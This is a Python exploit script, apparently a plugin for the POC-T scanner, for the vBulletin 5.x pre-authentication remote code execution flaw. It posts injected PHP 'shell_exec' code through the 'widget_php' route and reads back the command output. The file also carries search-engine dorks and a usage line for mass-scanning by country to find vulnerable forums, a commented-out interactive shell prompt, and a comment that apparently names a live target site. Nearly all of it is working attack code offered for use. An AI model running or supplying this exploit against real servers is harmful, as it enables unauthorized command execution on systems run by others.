#!/usr/bin/python
#coding: UTF-8
#
# vBulletin 5.x 0day pre-auth RCE exploit
# 
# This should work on all versions from 5.0.0 till 5.5.4
#
# Google Dorks:
# - site:*.vbulletin.net
# - "Powered by vBulletin Version 5.5.4"


 # USAGE: python POC-T.py -s vbulletin_RCE -aF "app=vBulletin&&country=DE"

                                             # __/
    # ____     ____     _____           ______/ __/
   # / __ \   / __ \   / ___/   ____   /__  __/_/
  # / /_/ /  / /_/ /  / /___   /___/     / /
 # / /___/   \____/   \____/            / /
# /_/                                  /_/
    # { Version 2.0.5 by cdxy mail:i@cdxy.me }

import requests
import sys



params = {"routestring":"ajax/render/widget_php"}

def judge(xstr):
    '''是否 没有敏感词, 如果没有, 就返回true
    boolean
    '''
    # 如果响应里有任一关键词, 就不认为命令执行成功了
    NOTWORDS = ['template',"css_links","script", 'META', 'meta','HTML','http']
    flag = True
    
    while flag:    
        for cha in NOTWORDS:
            if cha in xstr:
                flag = False
        
        return flag

def poc(url):
    url = url if "//" in url else "http://"+url
    
    try:
        #cmd = raw_input("vBulletin$ ")
        
        cmd = "whoami"
        
        params["widgetConfig[code]"] = "echo shell_exec('"+cmd+"'); exit;"
        r = requests.post(url = url, data = params)
        if r.status_code == 200:
            if judge(r.text):
            # 前两条过于宽泛!    
                return '{url}---[{text}]'.format(url=url,text=r.text)
                #   https://forum.jamtangan.com-k3876888
             #failed symbol
             #{"template":"","css_links":[]}
             #
        else:
            return False
             #sys.exit("Exploit failed! :(")
    except KeyboardInterrupt:
        return False
          #sys.exit("\nClosing shell...")
    except Exception, e:
        return False
        #sys.exit(str(e))